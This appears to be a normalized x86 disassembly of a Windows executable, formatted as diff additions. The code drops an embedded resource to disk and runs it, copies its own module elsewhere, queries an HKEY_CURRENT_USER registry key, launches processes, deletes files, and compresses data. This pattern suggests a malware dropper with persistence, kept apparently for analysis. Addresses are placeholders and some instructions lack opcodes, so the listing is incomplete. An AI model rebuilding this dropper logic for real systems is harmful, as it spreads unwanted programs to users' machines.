+push ebx
+push esi
+push edi
+mov edi rw-data
+push 0x104
+push rw-data
+[ edi ]
+push rw-data
+call [ ExpandEnvironmentStringsA@IAT ]
+test eax eax
+je r-xdata
+mov esi [ LoadLibraryA@IAT ]
+push rw-data
+call esi
+mov ebx [ GetProcAddress@IAT ]
+test eax eax
+je r-xdata
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+[ edi ]
+not ecx
+sub edi ecx
+push eax
+mov esi edi
+mov edx ecx
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+mov ecx edx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx edx
+push rw-data
+and ecx 0x3
+[ edi ] [ esi ]
+call [ CreateDirectoryA@IAT ]
+push rw-data
+call esi
+test eax eax
+jne r-xdata
+push rw-data
+push eax
+call ebx
+mov [ rw-data ] eax
+mov ecx 0x6
+mov esi rw-data
+lea edi [ esp + 0xc ]
+[ edi ] [ esi ]
+mov dl [ esp + 0xc ]
+xor ecx ecx
+dec dl
+mov [ esp + 0x24 ] ecx
+mov [ esp + 0xc ] dl
+lea edx [ esp + 0xc ]
+push edx
+push eax
+mov [ esp + 0x30 ] cx
+call ebx
+push rw-data
+mov [ rw-data ] eax
+call sub_4012a0
+add esp 0x4
+test eax eax
+jne r-xdata
+pop edi
+pop esi
+pop ebx
+add esp 0x20
+retn
+pop edi
+pop esi
+mov [ rw-data ] 0x927c0
+mov eax 0x1
+pop ebx
+add esp 0x20
+retn
+pop edi
+pop esi
+pop ebx
+add esp 0x20
+retn
+sub_402170
+mov eax 0x9504
+call sub_403590
+push ebx
+push ebp
+push esi
+push edi
+push rw-data
+call [ SetCurrentDirectoryA@IAT ]
+mov ecx 0x40
+xor eax eax
+lea edi [ esp + 0x71 ]
+mov [ esp + 0x70 ] 0x0
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov edi [ esp + 0x951c ]
+or ecx 0xffffffff
+xor eax eax
+lea edx [ esp + 0x70 ]
+[ edi ]
+not ecx
+sub edi ecx
+mov eax ecx
+mov esi edi
+mov edi edx
+lea edx [ esp + 0x70 ]
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+xor eax eax
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+and ecx 0x3
+[ edi ] [ esi ]
+mov ecx 0x11
+lea edi [ esp + 0x2c ]
+[ edi ]
+mov [ esp + 0x14 ] eax
+lea ecx [ esp + 0x2c ]
+mov [ esp + 0x18 ] eax
+push ecx
+mov [ esp + 0x20 ] eax
+mov [ esp + 0x30 ] 0x44
+mov [ esp + 0x24 ] eax
+call [ GetStartupInfoA@IAT ]
+mov ecx 0x3ff
+xor eax eax
+lea edi [ esp + 0x175 ]
+mov [ esp + 0x174 ] 0x0
+[ edi ]
+stosw [ edi ]
+stosb [ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+lea edx [ esp + 0x174 ]
+[ edi ]
+not ecx
+sub edi ecx
+mov [ esp + 0x5c ] 0x0
+mov eax ecx
+mov esi edi
+mov edi edx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+and ecx 0x3
+xor eax eax
+[ edi ] [ esi ]
+or ecx 0xffffffff
+mov edi rw-data
+[ edi ]
+not ecx
+sub edi ecx
+lea edx [ esp + 0x174 ]
+mov esi edi
+mov ebx ecx
+or ecx 0xffffffff
+mov edi edx
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea edx [ esp + 0x174 ]
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi [ esp + 0x9518 ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov ebx ecx
+mov esi edi
+or ecx 0xffffffff
+mov edi edx
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea edx [ esp + 0x174 ]
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea edx [ esp + 0x174 ]
+and ecx 0x3
+[ edi ] [ esi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea edx [ esp + 0x174 ]
+and ecx 0x3
+[ edi ] [ esi ]
+lea edi [ esp + 0x70 ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebx ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebx
+lea eax [ esp + 0x14 ]
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+lea ecx [ esp + 0x30 ]
+lea edx [ esp + 0x178 ]
+push ecx
+push 0x0
+push 0x0
+push 0x0
+push 0x0
+push 0x0
+push 0x0
+push edx
+push 0x0
+call [ CreateProcessA@IAT ]
+test eax eax
+jne r-xdata
+mov eax [ esp + 0x14 ]
+push 0xffffffff
+push eax
+call [ WaitForSingleObject@IAT ]
+mov ecx [ esp + 0x14 ]
+mov esi [ CloseHandle@IAT ]
+push ecx
+call esi
+mov edx [ esp + 0x18 ]
+push edx
+call esi
+lea eax [ esp + 0x70 ]
+push rw-data
+push eax
+call [ fopen@IAT ]
+mov edi [ fseek@IAT ]
+mov esi eax
+push 0x2
+push 0x0
+push esi
+call edi
+push esi
+call [ ftell@IAT ]
+push 0x0
+mov ebx eax
+push 0x0
+push esi
+mov [ esp + 0x4c ] ebx
+call edi
+inc ebx
+push ebx
+call [ malloc@IAT ]
+mov ebp eax
+add esp 0x28
+test ebp ebp
+jne r-xdata
+call [ GetLastError@IAT ]
+push eax
+push rw-data
+call [ printf@IAT ]
+add esp 0x8
+xor eax eax
+pop edi
+pop esi
+pop ebp
+pop ebx
+add esp 0x9504
+retn
+mov ecx ebx
+xor eax eax
+mov edx ecx
+mov edi ebp
+shr ecx 0x2
+[ edi ]
+mov ecx edx
+push esi
+and ecx 0x3
+[ edi ]
+mov eax [ esp + 0x2c ]
+push eax
+push 0x1
+push ebp
+call [ fread@IAT ]
+mov edi [ fclose@IAT ]
+push esi
+call edi
+add esp 0x14
+lea ecx [ esp + 0x70 ]
+push ecx
+call [ DeleteFileA@IAT ]
+lea ecx [ esp + 0x1174 ]
+call sub_4028d0
+lea edx [ esp + 0x24 ]
+lea eax [ esp + 0x10 ]
+push edx
+push eax
+push ebx
+push ebp
+lea ecx [ esp + 0x1184 ]
+call sub_4034e0
+mov ecx [ esp + 0x951c ]
+push rw-data
+push ecx
+call [ fopen@IAT ]
+mov esi eax
+add esp 0x8
+test esi esi
+jne r-xdata
+push esi
+call [ fclose@IAT ]
+add esp 0x4
+lea ecx [ esp + 0x70 ]
+push ecx
+call [ DeleteFileA@IAT ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+add esp 0x9504
+retn
+mov edx [ esp + 0x24 ]
+mov eax [ esp + 0x10 ]
+push esi
+push edx
+push 0x1
+push eax
+call [ fwrite@IAT ]
+push esi
+call edi
+push ebp
+call [ free@IAT ]
+add esp 0x18
+lea ecx [ esp + 0x10 ]
+push ecx
+lea ecx [ esp + 0x1178 ]
+call sub_403550
+pop edi
+pop esi
+pop ebp
+mov eax 0x1
+pop ebx
+add esp 0x9504
+retn
+pop edi
+pop esi
+pop ebp
+pop ebx
+add esp 0x9504
+retn
+sub_402500
+push ecx
+push ebx
+push ebp
+push esi
+push edi
+push 0x0
+mov [ esp + 0x14 ] 0x0
+call [ GetModuleHandleA@IAT ]
+mov esi eax
+mov eax [ esp + 0x1c ]
+and eax 0xffff
+push rw-data
+push eax
+push esi
+call [ FindResourceA@IAT ]
+mov ebx eax
+push ebx
+push esi
+call [ LoadResource@IAT ]
+push ebx
+push esi
+mov edi eax
+call [ SizeofResource@IAT ]
+test edi edi
+mov ebp eax
+jne r-xdata
+mov ecx [ esp + 0x18 ]
+push 0x0
+push 0x80
+push 0x2
+push 0x0
+push 0x0
+push 0x1f01ff
+push ecx
+call [ CreateFileA@IAT ]
+mov ebx eax
+cmp ebx 0xffffffff
+jne r-xdata
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+pop ecx
+retn
+test ebp ebp
+mov esi ebp
+jbe r-xdata
+push edi
+call [ FreeResource@IAT ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+pop ecx
+retn
+push ebx
+call [ CloseHandle@IAT ]
+push edi
+call [ FreeResource@IAT ]
+pop edi
+pop esi
+pop ebp
+mov eax 0x1
+pop ebx
+pop ecx
+retn
+mov eax ebp
+lea edx [ esp + 0x10 ]
+sub eax esi
+push 0x0
+push edx
+add eax edi
+push esi
+push eax
+push ebx
+mov [ esp + 0x24 ] 0x0
+call [ WriteFile@IAT ]
+test eax eax
+je r-xdata
+push ebx
+call [ CloseHandle@IAT ]
+mov ecx [ esp + 0x18 ]
+push ecx
+call [ DeleteFileA@IAT ]
+push edi
+call [ FreeResource@IAT ]
+pop edi
+pop esi
+pop ebp
+xor eax eax
+pop ebx
+pop ecx
+retn
+sub esi [ esp + 0x10 ]
+jne r-xdata
+sub_4025f0
+sub esp 0x108
+push edi
+mov ecx 0x41
+xor eax eax
+lea edi [ esp + 0x5 ]
+mov [ esp + 0x4 ] 0x0
+push 0x104
+[ edi ]
+lea eax [ esp + 0x8 ]
+push eax
+push 0x0
+call [ GetModuleFileNameA@IAT ]
+test eax eax
+je r-xdata
+pop edi
+add esp 0x108
+retn
+lea ecx [ esp + 0x4 ]
+push rw-data
+push ecx
+call [ strstr@IAT ]
+mov edx eax
+add esp 0x8
+test edx edx
+je r-xdata
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+push esi
+[ edi ]
+not ecx
+sub edi ecx
+push 0x66
+mov eax ecx
+mov esi edi
+mov edi edx
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx eax
+and ecx 0x3
+[ edi ] [ esi ]
+lea ecx [ esp + 0xc ]
+push ecx
+call sub_402500
+add esp 0x8
+test eax eax
+pop esi
+je r-xdata
+push 0x1
+push 0x0
+lea edx [ esp + 0xc ]
+push 0x0
+push edx
+push rw-data
+push 0x0
+call [ ShellExecuteA@IAT ]
+sub_402690
+sub esp 0x43c
+push ebp
+push esi
+mov esi [ esp + 0x448 ]
+push edi
+push 0x3
+push rw-data
+push esi
+call [ strncmp@IAT ]
+mov ebp [ Sleep@IAT ]
+add esp 0xc
+test eax eax
+jne r-xdata
+mov ecx 0x41
+xor eax eax
+lea edi [ esp + 0x6d ]
+mov [ esp + 0x6c ] 0x0
+[ edi ]
+mov ecx 0x82
+lea edi [ esp + 0x175 ]
+mov [ esp + 0x174 ] al
+push 0x104
+[ edi ]
+lea eax [ esp + 0x70 ]
+mov [ esp + 0x14 ] 0x104
+push eax
+push 0x0
+call [ GetModuleFileNameA@IAT ]
+lea ecx [ esp + 0x380 ]
+push rw-data
+push ecx
+call [ lstrcpyA@IAT ]
+lea edx [ esp + 0xc ]
+lea eax [ esp + 0x380 ]
+push edx
+push eax
+push 0x80000001
+call [ RegOpenKeyA@IAT ]
+test eax eax
+jne r-xdata
+push 0xbb8
+call ebp
+add esi 0x3
+push esi
+call [ DeleteFileA@IAT ]
+pop edi
+pop esi
+pop ebp
+add esp 0x43c
+retn
+lea ecx [ esp + 0x10 ]
+lea edx [ esp + 0x174 ]
+push ecx
+mov ecx [ esp + 0x10 ]
+lea eax [ esp + 0x28 ]
+push edx
+push eax
+push 0x0
+push rw-data
+push ecx
+call [ RegQueryValueExA@IAT ]
+mov edx [ esp + 0xc ]
+push edx
+call [ RegCloseKey@IAT ]
+mov edi rw-data
+or ecx 0xffffffff
+xor eax eax
+lea edx [ esp + 0x174 ]
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov edi edx
+mov edx ecx
+or ecx 0xffffffff
+[ edi ]
+mov ecx edx
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx edx
+lea eax [ esp + 0x174 ]
+and ecx 0x3
+[ edi ] [ esi ]
+lea esi [ esp + 0x6c ]
+sbb eax eax
+sbb eax 0xffffffff
+test cl cl
+je r-xdata
+call sub_401450
+call sub_4025f0
+lea eax [ esp + 0x174 ]
+push 0x0
+lea ecx [ esp + 0x70 ]
+push eax
+push ecx
+call [ CopyFileA@IAT ]
+mov ecx 0x11
+xor eax eax
+lea edi [ esp + 0x28 ]
+xor edx edx
+[ edi ]
+mov edi rw-data
+or ecx 0xffffffff
+[ edi ]
+mov [ esp + 0x14 ] edx
+mov [ esp + 0x28 ] 0x44
+mov [ esp + 0x18 ] edx
+mov [ esp + 0x1c ] edx
+not ecx
+mov [ esp + 0x20 ] edx
+sub edi ecx
+lea edx [ esp + 0x174 ]
+mov esi edi
+mov ebp ecx
+mov edi edx
+or ecx 0xffffffff
+lea edx [ esp + 0x174 ]
+[ edi ]
+mov ecx ebp
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebp
+and ecx 0x3
+[ edi ] [ esi ]
+lea edi [ esp + 0x6c ]
+or ecx 0xffffffff
+[ edi ]
+not ecx
+sub edi ecx
+mov esi edi
+mov ebp ecx
+mov edi edx
+or ecx 0xffffffff
+[ edi ]
+mov ecx ebp
+dec edi
+shr ecx 0x2
+[ edi ] [ esi ]
+mov ecx ebp
+lea eax [ esp + 0x14 ]
+and ecx 0x3
+push eax
+[ edi ] [ esi ]
+lea ecx [ esp + 0x2c ]
+lea edx [ esp + 0x178 ]
+push ecx
+push 0x0
+push 0x0
+push 0x0
+push 0x0
+push 0x0
+push 0x0
+push edx
+push 0x0
+call [ CreateProcessA@IAT ]
+xor eax eax
+jmp r-xdata
+mov dl [ eax + 0x1 ]
+mov cl dl
+cmp dl [ esi + 0x1 ]
+jne r-xdata
+push 0x186a0
+call ebp
+jmp r-xdata
+test eax eax
+je r-xdata
+add eax 0x2
+add esi 0x2
+test cl cl
+jne r-xdata
+mov dl [ eax ]
+mov cl dl
+cmp dl [ esi ]
+jne r-xdata
+sub_402910
+sub esp 0x8
+push ebx
+push ebp
+mov ebp [ esp + 0x14 ]
+push esi
+movsx ebx bp
+movzx si [ ebx + ecx + 0x8 ]
+lea edx [ ebx + ecx + 0x8 ]
+push edi
+mov [ esp + 0x14 ] edx
+mov edx 0x1000
+mov [ ecx + ebx * 2 + 0x1048 ] dx
+mov [ ecx + ebx * 2 + 0x304a ] dx
+mov eax 0x1
+mov [ esp + 0x10 ] ebx
+add esi 0x1001
+mov [ ecx + 0x1046 ] 0x0
+jmp r-xdata
+test ax ax
+jl r-xdata
+movsx edx si
+mov ax [ ecx + edx * 2 + 0x1048 ]
+cmp ax 0x1000
+je r-xdata
+movsx eax si
+mov ax [ ecx + eax * 2 + 0x304a ]
+cmp ax 0x1000
+je r-xdata
+movsx eax si
+pop edi
+mov [ ecx + eax * 2 + 0x1048 ] bp
+mov [ ecx + ebx * 2 + 0x524c ] si
+pop esi
+pop ebp
+pop ebx
+add esp 0x8
+retn 0x4
+mov esi eax
+mov edx 0x1
+movsx edi si
+movsx eax si
+pop edi
+mov [ ecx + eax * 2 + 0x304a ] bp
+mov [ ecx + ebx * 2 + 0x524c ] si
+pop esi
+pop ebp
+pop ebx
+add esp 0x8
+retn 0x4
+jmp r-xdata
+cmp dx 0x2
+jle r-xdata
+inc edx
+cmp dx 0x3c
+jl r-xdata
+mov ebx [ esp + 0x10 ]
+mov ebp [ esp + 0x1c ]
+cmp dx [ ecx + 0x1046 ]
+mov ebp [ esp + 0x1c ]
+jle r-xdata
+mov ebp [ esp + 0x14 ]
+movsx eax dx
+lea ebx [ eax + edi ]
+movzx ax [ eax + ebp ]
+movzx bx [ ebx + ecx + 0x8 ]
+sub eax ebx
+test ax ax
+jne r-xdata
+cmp dx [ ecx + 0x1046 ]
+mov ebx [ esp + 0x10 ]
+jne r-xdata
+mov ebx ebp
+mov [ ecx + 0x1046 ] dx
+sub ebx esi
+and ebx 0xfff
+dec ebx
+cmp dx 0x3c
+mov [ ecx + 0x1044 ] bx
+jge r-xdata
+mov edx ebx
+sub edx edi
+xor edi edi
+mov di [ ecx + 0x1044 ]
+and edx 0xfff
+dec edx
+cmp edx edi
+jae r-xdata
+mov edx [ esp + 0x10 ]
+movsx eax si
+mov di [ ecx + eax * 2 + 0x524c ]
+mov [ ecx + edx * 2 + 0x524c ] di
+mov di [ ecx + eax * 2 + 0x1048 ]
+mov [ ecx + edx * 2 + 0x1048 ] di
+mov di [ ecx + eax * 2 + 0x304a ]
+mov [ ecx + edx * 2 + 0x304a ] di
+movsx edx [ ecx + eax * 2 + 0x1048 ]
+mov [ ecx + edx * 2 + 0x524c ] bp
+movsx edx [ ecx + eax * 2 + 0x304a ]
+mov [ ecx + edx * 2 + 0x524c ] bp
+movsx edx [ ecx + eax * 2 + 0x524c ]
+cmp [ ecx + edx * 2 + 0x304a ] si
+jne r-xdata
+mov [ ecx + 0x1044 ] dx
+jmp r-xdata
+pop edi
+mov [ ecx + edx * 2 + 0x1048 ] bp
+pop esi
+pop ebp
+mov [ ecx + eax * 2 + 0x524c ] 0x1000
+pop ebx
+add esp 0x8
+retn 0x4
+pop edi
+mov [ ecx + edx * 2 + 0x304a ] bp
+pop esi
+pop ebp
+mov [ ecx + eax * 2 + 0x524c ] 0x1000
+pop ebx
+add esp 0x8
+retn 0x4
+sub_402b10
+push ebx
+mov bx [ esp + 0x8 ]
+push esi
+movsx esi bx
+cmp [ ecx + esi * 2 + 0x524c ] 0x1000
+je r-xdata
+pop esi
+pop ebx
+retn 0x4
+mov dx [ ecx + esi * 2 + 0x304a ]
+mov ax [ ecx + esi * 2 + 0x1048 ]
+cmp dx 0x1000
+push edi
+je r-xdata
+mov di [ ecx + esi * 2 + 0x524c ]
+movsx edx ax
+mov [ ecx + edx * 2 + 0x524c ] di
+pop edi
+movsx edx [ ecx + esi * 2 + 0x524c ]
+cmp [ ecx + edx * 2 + 0x304a ] bx
+jne r-xdata
+cmp ax 0x1000
+jne r-xdata
+mov [ ecx + edx * 2 + 0x1048 ] ax
+mov [ ecx + esi * 2 + 0x524c ] 0x1000
+mov [ ecx + edx * 2 + 0x304a ] ax
+mov [ ecx + esi * 2 + 0x524c ] 0x1000
+pop esi
+pop ebx
+retn 0x4
+movsx edx ax
+mov di [ ecx + edx * 2 + 0x304a ]
+cmp di 0x1000
+je r-xdata
+mov eax edx
+jmp r-xdata
+mov di [ ecx + esi * 2 + 0x304a ]
+mov [ ecx + edx * 2 + 0x304a ] di
+movsx edx [ ecx + esi * 2 + 0x304a ]
+mov [ ecx + edx * 2 + 0x524c ] ax
+mov eax edi
+movsx edx ax
+mov di [ ecx + edx * 2 + 0x304a ]
+cmp di 0x1000
+jne r-xdata
+movsx edx ax
+push ebp
+movsx edi [ ecx + edx * 2 + 0x524c ]
+mov bp [ ecx + edx * 2 + 0x1048 ]
+mov [ ecx + edi * 2 + 0x304a ] bp
+mov bp [ ecx + edx * 2 + 0x524c ]
+movsx edi [ ecx + edx * 2 + 0x1048 ]
+mov [ ecx + edi * 2 + 0x524c ] bp
+mov di [ ecx + esi * 2 + 0x1048 ]
+mov [ ecx + edx * 2 + 0x1048 ] di
+pop ebp
+movsx edi [ ecx + esi * 2 + 0x1048 ]
+mov [ ecx + edi * 2 + 0x524c ] ax
+sub_402c50
+push ebx
+push esi
+mov esi ecx
+mov ebx [ esp + 0xc ]
+push edi
+mov edi [ esp + 0x14 ]
+mov al [ esi + 0x837c ]
+xor cx cx
+mov cl al
+mov edx edi
+shr dx cl
+add al bl
+mov [ esi + 0x837c ] al
+or [ esi + 0x837a ] dx
+cmp al 0x8
+jb r-xdata
+pop edi
+pop esi
+pop ebx
+retn 0x8
+xor eax eax
+mov ecx esi
+mov ax [ esi + 0x837a ]
+shr eax 0x8
+push eax
+call sub_4034c0
+cmp eax 0xffffffff
+je r-xdata
+mov cl [ esi + 0x837c ]
+add cl 0xf8
+mov al cl
+mov [ esi + 0x837c ] cl
+cmp al 0x8
+jb r-xdata
+mov eax [ esi + 0x4 ]
+xor edx edx
+mov dh [ esi + 0x837a ]
+inc eax
+mov [ esi + 0x837a ] dx
+mov [ esi + 0x4 ] eax
+xor ecx ecx
+mov cx [ esi + 0x837a ]
+push ecx
+mov ecx esi
+call sub_4034c0
+cmp eax 0xffffffff
+je r-xdata
+mov ecx [ esi + 0x4 ]
+mov al [ esi + 0x837c ]
+add ecx 0x2
+add al 0xf8
+mov [ esi + 0x4 ] ecx
+mov ecx ebx
+sub ecx eax
+mov [ esi + 0x837c ] al
+shl edi cl
+mov [ esi + 0x837a ] di
+pop edi
+pop esi
+pop ebx
+retn 0x8
+sub_402d10
+push ebx
+push esi
+push edi
+xor eax eax
+lea edx [ ecx + 0x7e90 ]
+mov esi 0x1
+lea edi [ eax + 0x273 ]
+mov [ edx - 0xc42 ] si
+mov [ edx ] di
+mov [ edx - 0x274 ] ax
+inc eax
+add edx 0x2
+cmp ax 0x13a
+jl r-xdata
+xor esi esi
+mov edx 0x13a
+lea edi [ ecx + 0x8104 ]
+movsx eax si
+add edi 0x2
+mov bx [ ecx + eax * 2 + 0x7250 ]
+add bx [ ecx + eax * 2 + 0x724e ]
+mov [ edi - 0xc44 ] bx
+mov [ edi - 0x2 ] si
+mov [ ecx + eax * 2 + 0x7738 ] dx
+mov [ ecx + eax * 2 + 0x7736 ] dx
+add esi 0x2
+inc edx
+cmp dx 0x272
+jle r-xdata
+pop edi
+pop esi
+mov [ ecx + 0x7734 ] 0xffff
+mov [ ecx + 0x7c1a ] 0x0
+pop ebx
+retn
+sub_402da0
+sub esp 0xc
+push ebx
+push ebp
+push esi
+push edi
+mov edi ecx
+xor ebx ebx
+mov ebp 0x273
+lea ecx [ edi + 0x7e90 ]
+add ecx 0x2
+dec ebp
+jne r-xdata
+xor eax eax
+mov ax [ ecx - 0xc42 ]
+inc eax
+cdq
+movsx esi bx
+sub eax edx
+sar eax 0x1
+mov [ edi + esi * 2 + 0x724e ] ax
+mov ax [ ecx ]
+mov [ edi + esi * 2 + 0x7e90 ] ax
+inc ebx
+cmp [ ecx ] 0x273
+jl r-xdata
+xor eax eax
+mov ecx 0x13a
+lea edx [ edi + 0x74c2 ]
+mov [ esp + 0x10 ] eax
+mov [ esp + 0x14 ] ecx
+mov [ esp + 0x18 ] edx
+jmp r-xdata
+lea edx [ eax + 0x1 ]
+movsx edx dx
+movsx eax ax
+mov bp [ edi + edx * 2 + 0x724e ]
+mov edx [ esp + 0x18 ]
+add bp [ edi + eax * 2 + 0x724e ]
+lea eax [ ecx - 0x1 ]
+mov [ edx ] bp
+movsx edx ax
+cmp bp [ edi + edx * 2 + 0x724e ]
+jae r-xdata
+inc eax
+mov esi eax
+shl esi 0xf
+sub esi eax
+add esi ecx
+movsx ebx ax
+shl esi 0x1
+and esi 0xffff
+lea eax [ edi + ebx * 2 + 0x724e ]
+push esi
+push eax
+lea eax [ edi + ebx * 2 + 0x7250 ]
+push eax
+call [ memmove@IAT ]
+mov [ edi + ebx * 2 + 0x724e ] bp
+lea ebp [ edi + ebx * 2 + 0x7e90 ]
+push esi
+lea ecx [ edi + ebx * 2 + 0x7e92 ]
+push ebp
+push ecx
+call [ memmove@IAT ]
+mov eax [ esp + 0x28 ]
+mov edx [ esp + 0x30 ]
+mov [ ebp ] ax
+add eax 0x2
+mov [ esp + 0x28 ] eax
+mov eax [ esp + 0x2c ]
+add esp 0x18
+inc eax
+add edx 0x2
+cmp ax 0x273
+mov [ esp + 0x14 ] eax
+mov [ esp + 0x18 ] edx
+jl r-xdata
+dec eax
+movsx edx ax
+cmp bp [ edi + edx * 2 + 0x724e ]
+jb r-xdata
+mov eax [ esp + 0x10 ]
+mov ecx [ esp + 0x14 ]
+xor eax eax
+lea edx [ edi + 0x7e90 ]
+mov [ edi + ecx * 2 + 0x7736 ] ax
+inc eax
+add edx 0x2
+cmp ax 0x273
+jl r-xdata
+mov [ edi + ecx * 2 + 0x7738 ] ax
+mov cx [ edx ]
+cmp cx 0x273
+movsx ecx cx
+jge r-xdata
+pop edi
+pop esi
+pop ebp
+pop ebx
+add esp 0xc
+retn
+sub_402f00
+push ebx
+push ebp
+push esi
+mov esi ecx
+push edi
+cmp [ esi + 0x7732 ] 0x8000
+jne r-xdata
+movsx eax [ esp + 0x14 ]
+mov bx [ esi + eax * 2 + 0x7c1c ]
+call sub_402da0
+movsx edx bx
+mov bx [ esi + edx * 2 + 0x7736 ]
+test bx bx
+jne r-xdata
+inc eax
+movsx ecx ax
+cmp di [ esi + ecx * 2 + 0x724e ]
+jbe r-xdata
+movsx edx bx
+lea eax [ ebx + 0x1 ]
+inc [ esi + edx * 2 + 0x724e ]
+mov di [ esi + edx * 2 + 0x724e ]
+movsx ecx ax
+cmp di [ esi + ecx * 2 + 0x724e ]
+jbe r-xdata
+pop edi
+pop esi
+pop ebp
+pop ebx
+retn 0x4
+dec eax
+movsx ecx ax
+mov bp [ esi + ecx * 2 + 0x724e ]
+mov [ esi + edx * 2 + 0x724e ] bp
+mov [ esi + ecx * 2 + 0x724e ] di
+mov di [ esi + edx * 2 + 0x7e90 ]
+movsx ebp di
+cmp di 0x273
+mov [ esi + ebp * 2 + 0x7736 ] ax
+jge r-xdata
+inc eax
+movsx ecx ax
+cmp di [ esi + ecx * 2 + 0x724e ]
+ja r-xdata
+mov bp [ esi + ecx * 2 + 0x7e90 ]
+mov [ esi + ecx * 2 + 0x7e90 ] di
+movsx ecx bp
+cmp bp 0x273
+mov [ esi + ecx * 2 + 0x7736 ] bx
+jge r-xdata
+mov [ esi + ebp * 2 + 0x7738 ] ax
+mov [ esi + edx * 2 + 0x7e90 ] bp
+mov ebx eax
+mov [ esi + ecx * 2 + 0x7738 ] bx
+sub_403000
+push ecx
+push ebx
+mov ebx [ esp + 0xc ]
+push esi
+push edi
+mov eax ebx
+xor edi edi
+mov esi ecx
+and eax 0xffff
+mov [ esp + 0xc ] edi
+mov ax [ esi + eax * 2 + 0x7c1c ]
+movsx ecx ax
+inc edi
+mov ax [ esi + ecx * 2 + 0x7736 ]
+cmp ax 0x272
+jne r-xdata
+add [ esp + 0xc ] 0x8000
+shr [ esp + 0xc ] 0x1
+test al 0x1
+je r-xdata
+mov edx [ esp + 0xc ]
+mov ecx esi
+push edx
+push edi
+call sub_402c50
+mov ax [ esp + 0xc ]
+push ebx
+mov ecx esi
+mov [ esi + 0x837e ] ax
+mov [ esi + 0x8380 ] di
+call sub_402f00
+pop edi
+pop esi
+pop ebx
+pop ecx
+retn 0x4
+sub_403080
+push esi
+mov esi [ esp + 0x8 ]
+mov ax si
+push edi
+shr ax 0x6
+mov edi ecx
+and eax 0xffff
+xor ecx ecx
+movzx dx [ eax + rw-data ]
+mov ch [ eax + rw-data ]
+push ecx
+push edx
+mov ecx edi
+call sub_402c50
+shl esi 0xa
+push esi
+push 0x6
+mov ecx edi
+call sub_402c50
+pop edi
+pop esi
+retn 0x4
+sub_4030c0
+push esi
+mov esi ecx
+mov al [ esi + 0x837c ]
+test al al
+je r-xdata
+pop esi
+retn
+xor eax eax
+mov ax [ esi + 0x837a ]
+shr eax 0x8
+push eax
+call sub_4034c0
+cmp eax 0xffffffff
+je r-xdata
+inc [ esi + 0x4 ]
+sub_4030f0
+sub esp 0xc
+xor eax eax
+push ebp
+push esi
+mov esi ecx
+xor ebp ebp
+mov al [ esi ]
+mov [ esi + 0x4 ] ebp
+push eax
+call sub_4034c0
+mov ecx [ esi ]
+shr ecx 0x8
+and ecx 0xff
+push ecx
+mov ecx esi
+call sub_4034c0
+mov edx [ esi ]
+mov ecx esi
+shr edx 0x10
+and edx 0xff
+push edx
+call sub_4034c0
+mov eax [ esi ]
+mov ecx esi
+shr eax 0x18
+push eax
+call sub_4034c0
+cmp [ esi ] ebp
+je r-xdata
+pop esi
+pop ebp
+add esp 0xc
+retn
+push ebx
+push edi
+mov ecx esi
+mov [ esi ] ebp
+call sub_402d10
+mov ecx esi
+call sub_4028e0
+lea edi [ esi + 0x8 ]
+mov ecx 0x3f1
+mov eax 0x20202020
+mov ebx 0xfc4
+[ edi ]
+xor edi edi
+mov [ esp + 0x10 ] edi
+movsx edx di
+mov [ esp + 0x10 ] edi
+mov [ esi ] edx
+mov [ esp + 0x14 ] 0xfc3
+movsx ecx di
+inc edi
+cmp di 0x3c
+mov [ ecx + esi + 0xfcc ] al
+jl r-xdata
+mov eax [ esp + 0x14 ]
+mov ecx esi
+push eax
+call sub_402910
+mov eax [ esp + 0x14 ]
+dec eax
+cmp ax 0xf88
+mov [ esp + 0x14 ] eax
+jge r-xdata
+push 0xfc4
+mov ecx esi
+call sub_402910
+jmp r-xdata
+mov ecx esi
+call sub_403490
+cmp ax 0xffff
+je r-xdata
+cmp [ esi + 0x1046 ] di
+jle r-xdata
+mov ax [ esi + 0x1046 ]
+cmp ax 0x2
+jg r-xdata
+mov [ esi + 0x1046 ] di
+add eax 0xfd
+mov ecx esi
+push eax
+call sub_403000
